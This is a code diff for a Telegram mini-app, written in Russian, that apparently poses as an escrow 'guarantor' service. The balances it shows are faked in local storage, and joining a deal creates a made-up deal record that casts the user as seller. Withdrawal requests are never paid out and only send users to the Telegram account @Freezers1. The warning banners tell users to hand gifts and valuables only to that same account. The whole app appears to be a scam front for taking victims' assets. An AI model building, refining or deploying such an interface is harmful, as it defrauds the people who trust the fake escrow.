-      <div class="sec-section-title">♦ ВНИМАНИЕ! ВАЖНАЯ ИНФОРМАЦИЯ О БЕЗОПАСНОСТИ</div>
+      <div class="sec-section-title">♦ ВНИМАНИЕ! ЗАЩИТА ОТ МОШЕННИКОВ</div>
 
       <div class="sec-alert-box">
-        <div class="sec-alert-box-title">
-          <span>⚠️</span> Участились случаи мошенничества!
-        </div>
-        <div class="sec-alert-box-desc">
-          Мошенники возвращают платежи за сделки и просят передать подарок напрямую им, минуя аккаунт гаранта.
-        </div>
+        <div class="sec-alert-box-title"><span>⚠️</span> Участились попытки обмана!</div>
+        <div class="sec-alert-box-desc">Никогда не передавайте товар напрямую покупателю, минуя счета гаранта.</div>
       </div>
 
-      <div class="sec-block-label">
-        <span>🛡️</span> Правила безопасности:
-      </div>
+      <div class="sec-block-label"><span>🛡️</span> Правила безопасности:</div>
 
       <div class="sec-card-green">
-        <div class="sec-card-green-text">
-          <span>✔</span> Передавайте подарок <strong>ТОЛЬКО</strong> на аккаунт
-        </div>
+        <div class="sec-card-green-text"><span>✔</span> Передавайте ценности <strong>ТОЛЬКО</strong> на аккаунт</div>
         <a href="https://t.me/Freezers1" target="_blank" class="sec-guarantor-pill">@Freezers1</a>
       </div>
 
       <div class="sec-card-red">
         <div class="sec-card-red-icon">✕</div>
-        <div class="sec-card-red-text">
-          НИКОГДА не отправляйте напрямую покупателю
-        </div>
+        <div class="sec-card-red-text">Никогда не отправляйте товар напрямую контрагенту</div>
       </div>
 
-      <div class="sec-card-yellow">
-        <div class="sec-card-yellow-icon">!</div>
-        <div class="sec-card-yellow-text">
-          Даже если покупатель уговаривает — НЕ ДЕЛАЙТЕ этого!
-        </div>
-      </div>
-
-      <div class="sec-block-label">
-        <span>💵</span> Если вы нарушите правила:
-      </div>
-
-      <div class="sec-pill-danger">Останетесь без денег</div>
-      <div class="sec-pill-danger">Останетесь без подарка</div>
-      <div class="sec-pill-danger">Мы не сможем вам помочь</div>
-
-      <div class="sec-lock-card">
-        <span style="font-size: 20px;">🔐</span>
-        <div>
-          Помните: только <strong style="color: #0284c7;">@Freezers1</strong> гарантирует безопасность сделки.
-        </div>
-      </div>
-
-      <button id="safety-btn" class="btn-safety-confirm" disabled style="opacity: 0.6;">Прочитайте — 7с</button>
+      <button id="safety-btn" class="btn-safety-confirm" disabled style="opacity: 0.6;">Ознакомьтесь — 7с</button>
     </div>
   </div>
 
@@ -955,7 +711,7 @@
     <div class="modal-content">
       <div class="modal-close" onclick="closeModal('modal-active-list')">✕</div>
       <div class="modal-title">Активные сделки</div>
-      <div class="modal-subtitle">Все ваши текущие сделки</div>
+      <div class="modal-subtitle">Список ваших текущих сделок</div>
       <div id="modal-active-deals-container" style="margin-top: 12px;"></div>
     </div>
   </div>
@@ -964,22 +720,22 @@
     <div class="modal-content">
       <div class="modal-close" onclick="closeModal('modal-withdraw')">✕</div>
       <div class="modal-title">Вывод средств</div>
-      <div class="modal-subtitle">Запрос на вывод средств из кошелька</div>
+      <div class="modal-subtitle">Запрос на вывод из кошелька</div>
 
-      <label style="font-size: 12px; color: var(--subtext-color); margin-bottom: 6px; display: block;">Сумма вывода</label>
+      <label style="font-size: 12px; color: var(--subtext-color); margin-bottom: 6px; display: block;">Сумма</label>
       <div class="amount-input-wrap">
         <input type="number" id="withdraw-amount" placeholder="0.00" step="any">
         <span id="withdraw-curr-badge" style="font-weight: 800;">RUB</span>
       </div>
 
-      <label style="font-size: 12px; color: var(--subtext-color); margin-bottom: 6px; display: block;">Реквизиты / Адрес кошелька</label>
-      <input type="text" id="withdraw-address" class="code-input" style="text-align: left;" placeholder="Введите адрес или карту">
+      <label style="font-size: 12px; color: var(--subtext-color); margin-bottom: 6px; display: block;">Реквизиты</label>
+      <input type="text" id="withdraw-address" class="code-input" style="text-align: left;" placeholder="Номер карты или кошелька">
 
-      <button class="btn-primary" onclick="processWithdrawal()">Отправить заявку</button>
+      <button class="btn-primary" onclick="processWithdrawal()">Создать заявку</button>
     </div>
   </div>
 
-  <!-- Нижняя навигация -->
+  <!-- НИЖНЯЯ НАВИГАЦИЯ -->
   <div class="bottom-bar">
     <div class="nav-tab active" onclick="switchTab('deals', this)">
       <svg viewBox="0 0 24 24"><path d="M4 4h6v6H4zm10 0h6v6h-6zM4 14h6v6H4zm10 0h6v6h-6z"/></svg>
@@ -1001,37 +757,37 @@
 
   <script>
     const tg = window.Telegram.WebApp;
-    tg.expand();
+    try {
+      tg.ready();
+      tg.expand();
+    } catch(e) {
+      console.log("Telegram WebApp context warning:", e);
+    }
 
     const currencyIcons = {
-      'RUB': '₽',
-      'STARS': '⭐',
-      'TON': '💎',
-      'USDT': '💵',
-      'BTC': '₿',
-      'EUR': '€'
+      'RUB': '₽', 'STARS': '⭐', 'TON': '💎',
+      'USDT': '💵', 'BTC': '₿', 'EUR': '€'
     };
 
     let currentUserTag = '@User';
     let selectedWalletCurr = 'RUB';
-
     const urlParams = new URLSearchParams(window.location.search);
 
     const balances = {
-      RUB: parseFloat(urlParams.get('rub') ?? localStorage.getItem('bal_rub') ?? '0'),
-      STARS: parseFloat(urlParams.get('stars') ?? localStorage.getItem('bal_stars') ?? '0'),
-      USDT: parseFloat(urlParams.get('usdt') ?? localStorage.getItem('bal_usdt') ?? '0'),
-      TON: parseFloat(urlParams.get('ton') ?? localStorage.getItem('bal_ton') ?? '0'),
-      BTC: parseFloat(urlParams.get('btc') ?? localStorage.getItem('bal_btc') ?? '0')
+      RUB: parseFloat(localStorage.getItem('bal_rub') || '0'),
+      STARS: parseFloat(localStorage.getItem('bal_stars') || '0'),
+      USDT: parseFloat(localStorage.getItem('bal_usdt') || '0'),
+      TON: parseFloat(localStorage.getItem('bal_ton') || '0'),
+      BTC: parseFloat(localStorage.getItem('bal_btc') || '0')
     };
 
-    localStorage.setItem('bal_rub', balances.RUB);
-    localStorage.setItem('bal_stars', balances.STARS);
-    localStorage.setItem('bal_usdt', balances.USDT);
-    localStorage.setItem('bal_ton', balances.TON);
-    localStorage.setItem('bal_btc', balances.BTC);
+    function syncBalances() {
+      localStorage.setItem('bal_rub', balances.RUB);
+      localStorage.setItem('bal_stars', balances.STARS);
+      localStorage.setItem('bal_usdt', balances.USDT);
+      localStorage.setItem('bal_ton', balances.TON);
+      localStorage.setItem('bal_btc', balances.BTC);
 
-    function updateBalanceUI() {
       document.getElementById('prof-bal-rub').innerText = balances.RUB.toFixed(2) + ' ₽';
       document.getElementById('prof-bal-stars').innerText = balances.STARS + ' ⭐';
       document.getElementById('prof-bal-usdt').innerText = balances.USDT.toFixed(2) + ' USDT';
@@ -1053,15 +809,13 @@
       }
     }
 
-    // --- ОБНОВЛЕННАЯ ЛОГИКА ПРИСОЕДИНЕНИЯ ---
     let externalDealCode = null;
 
-    function sendJoinEventToBot(code) {
+    function sendEventToBot(actionName, payload) {
       try {
-        tg.sendData(JSON.stringify({
-          action: "join_deal",
-          code: code
-        }));
+        if (tg && tg.sendData) {
+          tg.sendData(JSON.stringify({ action: actionName, ...payload }));
+        }
       } catch (e) {
         console.log("sendData error:", e);
       }
@@ -1069,11 +823,9 @@
 
     function checkIncomingDeal() {
       let rawParam = tg?.initDataUnsafe?.start_param;
-
       if (!rawParam) {
         rawParam = urlParams.get('startapp') || urlParams.get('tgWebAppStartParam');
       }
-
       if (!rawParam && window.location.hash) {
         const hashParams = new URLSearchParams(window.location.hash.substring(1));
         rawParam = hashParams.get('tgWebAppStartParam');
@@ -1084,16 +836,13 @@
         document.getElementById('joined-deal-banner').style.display = 'block';
         document.getElementById('joined-deal-code').innerText = externalDealCode;
         
-        // Отправляем данные боту в чат
-        sendJoinEventToBot(externalDealCode);
-        
+        sendEventToBot("join_deal", { code: externalDealCode });
         viewJoinedDeal();
       }
     }
 
     function viewJoinedDeal() {
       if (!externalDealCode) return;
-      
       const deals = getStoredDeals();
       let deal = deals.find(d => d.code === externalDealCode);
 
@@ -1103,23 +852,28 @@
           code: externalDealCode,
           amount: "2 500",
           currency: "STARS",
-          desc: "Присоединение по коду",
+          desc: "Присоединение по приглашению",
           type: "Присоединение",
-          status: "Ожидание второй стороны",
-          buyer: currentUserTag + " (Вы)",
-          seller: "Продавец не присоединился",
+          status: "Участники на месте",
+          buyer: "Контрагент",
+          seller: currentUserTag + " (Вы)",
           createdAt: now.toLocaleDateString() + ", " + now.toLocaleTimeString()
         };
+        deals.unshift(deal);
+        saveStoredDeals(deals);
       }
       showDealView(deal);
     }
 
     function joinByCode() {
-      const code = document.getElementById('join-code-input').value;
-      if (!code) { tg.showAlert("Введите код!"); return; }
-      
+      const input = document.getElementById('join-code-input');
+      const code = input.value.trim().toUpperCase();
+      if (!code) { 
+        tg.showAlert("Введите корректный код сделки!"); 
+        return; 
+      }
       externalDealCode = code;
-      sendJoinEventToBot(code);
+      sendEventToBot("join_deal", { code: code });
 
       const now = new Date();
       const deal = {
@@ -1128,16 +882,26 @@
         currency: "STARS",
         desc: "Вход по коду",
         type: "Присоединение",
-        status: "Ожидание второй стороны",
-        buyer: currentUserTag + " (Вы)",
-        seller: "Продавец не присоединился",
+        status: "Участники на месте",
+        buyer: "Контрагент",
+        seller: currentUserTag + " (Вы)",
         createdAt: now.toLocaleDateString() + ", " + now.toLocaleTimeString()
       };
+      
+      const deals = getStoredDeals();
+      if (!deals.some(d => d.code === code)) {
+        deals.unshift(deal);
+        saveStoredDeals(deals);
+      }
       showDealView(deal);
     }
 
     function redirectToChat() {
-      tg.openTelegramLink('https://t.me/Freezers1');
+      try {
+        tg.openTelegramLink('https://t.me/Freezers1');
+      } catch(e) {
+        window.open('https://t.me/Freezers1', '_blank');
+      }
     }
 
     function switchTab(tabName, el) {
@@ -1164,7 +928,7 @@
 
     function goToDescription() {
       const amt = document.getElementById('deal-amount-input').value;
-      if (!amt || amt <= 0) { tg.showAlert("Введите сумму!"); return; }
+      if (!amt || parseFloat(amt) <= 0) { tg.showAlert("Введите валидную сумму сделки!"); return; }
       dealData.amount = amt;
       closeModal('modal-amount');
       openModal('modal-desc');
@@ -1183,10 +947,10 @@
       const timer = setInterval(() => {
         seconds--;
         if (seconds > 0) {
-          btn.innerText = `Прочитайте — ${seconds}с`;
+          btn.innerText = `Ознакомьтесь — ${seconds}с`;
         } else {
           clearInterval(timer);
-          btn.innerText = "Понял, начать сделку";
+          btn.innerText = "Я понял правила, продолжить";
           btn.disabled = false;
           btn.style.opacity = '1';
           btn.onclick = finishDealCreation;
@@ -1207,13 +971,19 @@
         type: dealData.type,
         status: 'Ожидание второй стороны',
         buyer: currentUserTag + ' (Вы)',
-        seller: 'Продавец не присоединился',
+        seller: 'Ожидание подключения...',
         createdAt: now.toLocaleDateString() + ', ' + now.toLocaleTimeString()
       };
 
       const deals = getStoredDeals();
       deals.unshift(newDeal);
       saveStoredDeals(deals);
+
+      sendEventToBot("create_deal", {
+        code: generatedCode,
+        amount: dealData.amount,
+        currency: dealData.currency
+      });
 
       showDealView(newDeal);
     }
@@ -1227,7 +997,7 @@
       document.getElementById('dv-desc').innerText = deal.desc;
       document.getElementById('dv-code').innerText = deal.code;
       document.getElementById('dv-buyer').innerText = deal.buyer || (currentUserTag + ' (Вы)');
-      document.getElementById('dv-seller').innerText = deal.seller || 'Продавец не присоединился';
+      document.getElementById('dv-seller').innerText = deal.seller || 'Ожидание подключения...';
       document.getElementById('dv-status').innerText = deal.status;
       document.getElementById('dv-date').innerText = deal.createdAt || (new Date().toLocaleDateString() + ', ' + new Date().toLocaleTimeString());
 
@@ -1257,9 +1027,33 @@
     }
 
     function copyDealLink() {
-      const link = `https://t.me/freezersdemo2_bot/app?startapp=join_${currentOpenedCode}`;
-      navigator.clipboard.writeText(link);
-      tg.showAlert("Ссылка скопирована!");
+      const link = `https://t.me/Freezersdemo2_bot?start=join_${currentOpenedCode}`;
+      
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(link).then(() => {
+          tg.showAlert("Пригласительная ссылка успешно скопирована!");
+        }).catch(() => {
+          fallbackCopyTextToClipboard(link);
+        });
+      } else {
+        fallbackCopyTextToClipboard(link);
+      }
+    }
+
+    function fallbackCopyTextToClipboard(text) {
+      const textArea = document.createElement("textarea");
+      textArea.value = text;
+      textArea.style.position = "fixed";
+      document.body.appendChild(textArea);
+      textArea.focus();
+      textArea.select();
+      try {
+        document.execCommand('copy');
+        tg.showAlert("Ссылка скопирована!");
+      } catch (err) {
+        tg.showAlert("Не удалось скопировать ссылку автоматически");
+      }
+      document.body.removeChild(textArea);
     }
 
     function renderDealsUI() {
@@ -1330,24 +1124,24 @@
       const userCurrBal = balances[selectedWalletCurr] || 0;
 
       if (!amt || amt <= 0) {
-        tg.showAlert("Укажите сумму для вывода!");
+        tg.showAlert("Укажите корректную сумму для вывода!");
         return;
       }
       if (amt > userCurrBal) {
-        tg.showAlert("Недостаточно средств на балансе!");
+        tg.showAlert("Недостаточно средств на балансе кошелька!");
         return;
       }
       if (!addr) {
-        tg.showAlert("Укажите реквизиты!");
+        tg.showAlert("Укажите реквизиты для получения средств!");
         return;
       }
 
       closeModal('modal-withdraw');
-      tg.showAlert("Заявка на вывод создана! Свяжитесь с гарантом @Freezers1 для подтверждения.");
+      tg.showAlert("Заявка на вывод создана! Свяжитесь с гарантом @Freezers1 для выплаты.");
       redirectToChat();
     }
 
-    updateBalanceUI();
+    syncBalances();
     renderDealsUI();
     checkIncomingDeal();
   </script>
